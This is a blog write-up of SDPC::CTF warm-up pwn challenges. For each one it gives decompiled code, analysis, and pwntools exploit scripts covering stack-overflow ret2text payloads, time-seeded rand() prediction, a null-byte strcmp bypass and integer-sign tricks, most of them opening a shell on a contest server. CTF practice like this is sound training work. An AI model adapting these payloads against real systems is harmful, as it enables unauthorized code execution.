---
title: SDPC::CTF WriteUp
published: 2025-12-25
description: "SDPC::CTF 热身赛,部分题目的wp"
tags: ["ctfwp", "stack"]
category: ctf
draft: false
---

## pwn-test-nc2
直接输入b"bin/sh"直接获取sh

## pwn-littlegame
打开ida 发现是一个猜数字游戏，而且数字被硬编码到代码中，所以只需要输入 `42` 即可直接获取sh

## testnc_revenge
```bash
checksec ./pwn

Arch:           amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
打开 IDA 我们分析代码
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int buf[18]; // [rsp+0h] [rbp-50h] BYREF
  int fd; // [rsp+48h] [rbp-8h]
  int n119; // [rsp+4Ch] [rbp-4h]

  init(argc, argv, envp);
  fd = open("/dev/urandom", 0);
  read(fd, buf, 4u);
  puts("Can you finish this test?");
  seed = buf[0];
  srand(buf[0]);
  setNum();
  for ( n119 = 0; n119 <= 119; ++n119 )
  {
    if ( (unsigned int)cala((unsigned int)n119) )
    {
      puts("You lose");
      exit(-1);
    }
    puts("Good");
    puts("Next task");
  }
  puts("You got it!");
  system("cat flag");
  return 0;
}

_BOOL8 __fastcall cala(__int64 n119)
{
  unsigned int seed_2; // eax
  unsigned int seed_1; // eax
  unsigned int seed; // eax
  int v5; // [rsp+1Ch] [rbp-24h] BYREF
  int v6; // [rsp+20h] [rbp-20h] BYREF
  int v7; // [rsp+24h] [rbp-1Ch] BYREF
  int v8; // [rsp+2Ch] [rbp-14h]
  int v9; // [rsp+34h] [rbp-Ch]
  int v10; // [rsp+3Ch] [rbp-4h]

  if ( (int)n119 > 39 )
  {
    if ( (int)n119 > 79 )
    {
      v10 = rand() % 6;
      if ( !flag3 )
      {
        flag3 = 1;
        seed = rand();
        srand(seed);
        offset = rand() % 6;
      }
      printf("%d %c %d = \n", Num1[(int)n119], (unsigned int)sym[offset + v10], Num2[(int)n119]);
      __isoc99_scanf("%d", &v5);
      return (unsigned int)Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v10], (unsigned int)Num2[(int)n119]) != v5;
    }
    else
    {
      v9 = rand() % 6;
      if ( !flag2 )
      {
        flag2 = 1;
        seed_1 = rand();
        srand(seed_1);
        offset = rand() % 6;
      }
      printf("%d %c %d = \n", Num1[(int)n119], (unsigned int)sym[offset + v9], Num2[(int)n119]);
      __isoc99_scanf("%d", &v6);
      return (unsigned int)Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v9], (unsigned int)Num2[(int)n119]) != v6;
    }
  }
  else
  {
    v8 = rand() % 6;
    if ( !flag1 )
    {
      flag1 = 1;
      seed_2 = rand();
      srand(seed_2);
      offset = rand() % 6;
    }
    printf("%d %c %d = \n", Num1[(int)n119], (unsigned int)sym[offset + v8], Num2[(int)n119]);
    __isoc99_scanf("%d", &v7);
    return (unsigned int)Trueval((unsigned int)Num1[(int)n119], (unsigned int)sym[v8], (unsigned int)Num2[(int)n119]) != v7;
  }
}
__int64 __fastcall Trueval(unsigned int a1, char n120_1, int a3)
{
  __int64 n120; // rax

  n120 = (unsigned int)n120_1;
  if ( (_DWORD)n120 == 120 )
    return a3 * a1;
  if ( (int)n120 <= 120 )
  {
    if ( (_DWORD)n120 == 94 )
    {
      return a3 ^ a1;
    }
    else if ( (int)n120 <= 94 )
    {
      if ( (_DWORD)n120 == 45 )
      {
        return a1 - a3;
      }
      else if ( (int)n120 <= 45 )
      {
        if ( (_DWORD)n120 == 43 )
        {
          return a1 + a3;
        }
        else if ( (int)n120 <= 43 )
        {
          if ( (_DWORD)n120 == 37 )
          {
            return (unsigned int)((int)a1 % a3);
          }
          else if ( (_DWORD)n120 == 38 )
          {
            return a3 & a1;
          }
        }
      }
    }
  }
  return n120;
}
```
分析发现这是一个随机数答题的程序，其中的题目有三个阶段，而且在答题的时候，实际显示的运算符和程序内部的计算运算符不同，但是通过分析程序发现，这三个偏移量是在同一个时间生成并存储在`buf` 中
所以 只要确定了第一个阶段的偏移量，那么就可以确定第二阶段和第三阶段的偏移量，那么我们可以直接通过枚举的方式获得三个阶段的答题，从而获得shell。

所以写出如下exp.py 脚本

```python
from pwn import *
from typing import Callable
from dataclasses import dataclass
import time

# context.log_level = "debug"

"""
枚举所有的 可能偏移，最坏的情况下有 6^3 种情况
"""

@dataclass
class StageProc:
  proc: process
  procoffset: int

sym_list = ['+', '-', 'x', '%', '^', '&', '+', '-', 'x', '%', '^', '&']

def calculate(a: int, op: str, b: int) -> int:
  if op == '+':
    return a + b
  elif op == '-':
    return a - b
  elif op == 'x':
    return a * b
  elif op == '%':
    return a % b if b != 0 else 0
  elif op == '^':
    return a ^ b
  elif op == '&':
    return a & b
  else:
    return 0 

def calcPart(p: process, offset: int) -> int:
  global sym_list

  res = -1
  # log.info(f"Get calcPart")
  # time.sleep(.5)
  parts = p.recv().decode().split()
  while not "=" in parts:             # 防止因为io玄学问题导致接受不全
    parts += p.recv().decode().split()

  try:
    num1 = int(parts[-4])
    disOp = parts[-3]
    op = sym_list[sym_list.index(disOp) + offset]
    num2 = int(parts[-2])
    res = calculate(num1, op, num2)
    # log.info(f"Calc: {num1} {op} {num2} = {res}")
  except:
    log.error(f"calcPartsError: {parts}")
    log.error(f"Break!")
  return res

# 寻找获取
# stage ==> 1, 2, 3 
def findOffset(pFunc: Callable[[], process], stage: int) -> StageProc:
  # p = pFunc()
  offset = 0

  while True:
    p = pFunc()
    res = calcPart(p, offset)
    p.sendline(str(res).encode())
    back = p.recvline()

    if b"lose" in back:
      log.warn(f"findOffsetFail : {stage}")
      p.close()
      offset += 1
      offset = 0 if offset > 6 else offset
    else:
      log.success(f"findOffset {stage} : offset => {offset}")
      return StageProc(
        proc = p,
        procoffset = offset
      )
      # break

# 计算 该阶段接下来的题目
def CalcPartsWithOffset(ps: StageProc, stage: int) -> process:
  for _ in range(39):
    res = calcPart(ps.proc, ps.procoffset)
    ps.proc.sendline(str(res))
    back = ps.proc.recvline()

    if b"lose" in back:
      log.error(f"Stage{stage} CalcFail Step:{_}")
      raise ValueError("Stage Calc Fail Error!")
    # 尝试捕获最后几个算式
    if _ >= 37 and stage == 3:
      log.info(f"Proc: {_}: {back} ")
  
  return ps.proc

def pCreate() -> process:
  return process("./pwn")
  # return remote("175.27.251.122", 33490)
# 计算 阶段一
def Stage1() -> process:
  try:
    temp = findOffset(pCreate, 1)
    return CalcPartsWithOffset(temp, 1)
  except:
    log.error("Restart: Stage1")
    return Stage1()

def Stage2() -> process:
  try:
    temp = findOffset(Stage1, 2)
    return CalcPartsWithOffset(temp, 2)
  except:
    log.error("Restart: Stage2")
    return Stage2()

def Stage3() -> process:
  try:
    temp = findOffset(Stage2, 3)
    return CalcPartsWithOffset(temp, 3)
  except:
    log.error("Restart: Stage3")
    return Stage3()

def tryStageRetry() -> process:
  for attempt in range(10):
    try:
      res = Stage3()
      log.success(f"Stage3 第{attempt+1}次尝试成功")
      return res
    except PwnlibException as e:
      log.warning(f"Stage1 第{attempt+1}次尝试失败: {e}")
      time.sleep(1)

p = tryStageRetry()
print(p.recvall())      #显示答案
```

## pwn-ret2text

将题目文件拖入ida

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD v4[8]; // [rsp+0h] [rbp-40h] BYREF

  puts("hello hacker");
  gets(v4, argv);
  return 0;
}

int shell()
{
  puts("success");
  return system("/bin/sh");

}
```

发现main函数中存在一个栈溢出漏洞，存在后门函数 shell
于是得出如下后门函数

```python
from pwn import *
context.log_level = "debug"

ret = 0x40101a
backdoorAddr = 0x401176

# p = process("./pwn")
# 175.27.251.122:33550
p = remote("175.27.251.122", 33550)
# 这道题 本地文件 和线上文件 一点不一样需要 调整市局的发送顺序
payload = flat([
  b"a" * (8 * 2 * 4),
  p64(ret),
  p64(ret),
  p64(backdoorAddr),
])

p.sendline(payload)
p.interactive()
p.recv()
p.recvuntil(b"hello hacker\n")
```

## pwn-ret

与上题相同

得到如下exp脚本
```python
from pwn import *

context.log_level = "debug"

elf = ELF("./pwn")


p = process("./pwn")

offset = 72 + 8
backdoorAddr = elf.symbols["shell"]

payload = flat([
  b"a" * offset,
  p64(backdoorAddr)
])

p.recvuntil("hello hacker\n")
p.sendline(payload)

p.interactive()

```

## pwn-random

将文件拖入ida

```python
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int seed; // eax
  int v5; // [rsp+8h] [rbp-8h] BYREF
  int v6; // [rsp+Ch] [rbp-4h]

  seed = time(0);
  srand(seed);
  v6 = rand() % 100;
  __isoc99_scanf(&unk_402004, &v5);
  if ( v6 == v5 )
  {
    puts("You win!");
    system("/bin/sh");
  }
  else
  {
    printf("You lose! The number was %d\n", v6);
  }
  return 0;
}
```
可以发现程序用当前时间戳作为随机数种子，由于C语言的随机数算法是基于种子的伪随机数，所及只要种子知道那么随机数是可以预测的，所以可以在本地使用C写一个使用当前时间戳作为种子的随机数生成函数来预测随机数

于是可以得到如下exp攻击脚本
```python
from pwn import *
import ctypes

# remote('175.27.251.122', 33360)
context.log_level = "info"
# p = process("./pwn")
p = remote("175.27.251.122", 32878)

lib = ctypes.CDLL("./a.so")
lib.randd.restype = ctypes.c_int
lib.init()

u = lib.randd()
# print(u)
p.sendline(str(u))
p.interactive()
```
```c
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

void init(void)
{
  srandom(time(0));
}

int randd(void)
{
  return random() % 100;
}
// gcc -shared -fPIC -o ./a.so ./a.c
```

## str_err

将文件拖入ida
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char user_copy[41]; // [rsp+0h] [rbp-90h] BYREF
  char correct_password[7]; // [rsp+29h] [rbp-67h] BYREF
  char password[48]; // [rsp+30h] [rbp-60h] BYREF
  char username[48]; // [rsp+60h] [rbp-30h] BYREF

  init();
  strcpy(correct_password, "Secret");
  puts("====secure system====");
  puts("Please input your username: ");
  read(0, username, 0x30u);                      // # A1
  puts("Please input your password: ");
  read(0, password, 0x130u);                     // # B
  strcpy(user_copy, username);
  if ( strcmp(password, correct_password) )     // # A2
    exit(-1);
  puts("success!");
  return 0;
}

void __cdecl shell()
{
  system("/bin/sh");
  puts("I believe you can get shell!");
}
```
这是函数`main`的栈结构
```txt
-0000000000000090     char user_copy[41];
-0000000000000067     char correct_password[7];
-0000000000000060     char password[48];
-0000000000000030     char username[48];
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
```
分析得知`main`中存在栈溢出漏洞(B), 和一处字符串比较漏洞(A), 可以使用使用(B)处的溢出漏洞篡改整个栈的结构，同时由于函数`strcpy` 遇到`\x00`会截止，所以可以利用这一个特性绕过`strcmp(password, correct_password)`的判定

于是得出如下攻击脚本
```python
from pwn import *

context.log_level = "debug"

backdoorAddr = 0x40125b
ret          = 0x40101a

# p = process("./pwn")
# 175.27.251.122:33504
p = remote("175.27.251.122", 33504)

# username:/
p.recvuntil(b"Please input your username: \n")
payload = b"a" * 41 + b"Secret"
# payload = b"a"
p.send(payload)

p.recvuntil(b"Please input your password: \n")
payload = flat([
  b"Secret\0",
  b"a" * (41),
  b"a" * 41 + b"Secret\0",
  p64(ret),
  p64(ret),
  p64(backdoorAddr)
]) 
p.send(payload)

p.interactive()
```

## type_error

将题目文件拖入ida

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-20h] BYREF
  int v5[2]; // [rsp+4h] [rbp-1Ch] BYREF
  _BYTE s1[5]; // [rsp+Eh] [rbp-12h] BYREF
  _BYTE s2[5]; // [rsp+13h] [rbp-Dh] BYREF
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("=== Advanced Integer Overflow Challenge ===");
  puts("You need to enter a number that satisfies multiple conditions:");
  puts("1. As an unsigned integer, it must be smaller than 2,147,483,650");
  puts("2. As a signed integer, it must be less than 0");
  puts("3. It must pass a mathematical verification");
  puts("4. It must match a dynamically generated value\n");
  v5[1] = rand() % 1000;
  obfuscate_value((__int64)s1, 0x80000000);
  printf("Hint: The special value is obfuscated as 0x%02X%02X%02X%02X\n", s1[0], s1[1], s1[2], s1[3]);
  printf("Please enter a number: ");
  if ( (unsigned int)__isoc99_scanf("%u", &v4) != 1 )
  {
    puts("Invalid input!");
    exit(-1);
  }
  if ( (unsigned int)v4 > 0x80000007 )                                // # A1
  {
    puts("Failure: Input must be greater than 2,147,483,656!");
    exit(-1);
  }
  if ( v4 >= -4 )                                                     // # A2
  {
    puts("Failure: Input must be interpreted as negative!");
    exit(-1);
  }
  puts("success!warrior");
  if ( (unsigned int)__isoc99_scanf("%u", v5) != 1 )
  {
    puts("Invalid input!");
    exit(-1);
  }
  obfuscate_value((__int64)s2, v5[0]);                                
  if ( memcmp(s1, s2, 4u) )
  {
    puts("Failure: Obfuscated value mismatch!");
    exit(-1);
  }
  puts("Success! You found the correct value!");
  shell();
  return 0;
}

__int64 __fastcall obfuscate_value(__int64 p_s1, int a2)
{
  __int64 n3_1; // rax
  int v3; // [rsp+0h] [rbp-1Ch]
  __int64 p_s1_1; // [rsp+4h] [rbp-18h]
  unsigned int n3; // [rsp+18h] [rbp-4h]

  p_s1_1 = p_s1;
  v3 = a2;
  for ( n3 = 0; ; ++n3 )
  {
    n3_1 = n3;
    if ( n3 > 3 )
      break;
    *(_BYTE *)((int)n3 + p_s1_1) = *((_BYTE *)&v3 + (int)n3) ^ 0xAA;
  }
  return n3_1;
}
```
题目要求: 
+ 输入一个数字要求符合以下四个要求:
 1. 小于2,147,483,650
 2. 作为有符号整数需要小于0
 3. 它必须通过数学验证
 4. 它必须与动态生成的值匹配

也就是说第一个数`v4`必须作为无符号整数得小于`0x80000007`，同时作为有符号整数小于-4

同时第二个数`s2`需要满足 `obfuscate_value((__int64)s2, v5[0]);` 混淆之后与 `obfuscate_value((__int64)s1, 0x80000000);` 相同所以第二个数只能为`0x80000000`

所以只需要输入两次 `2147483648`(`0x80000000`) 即可得到shell
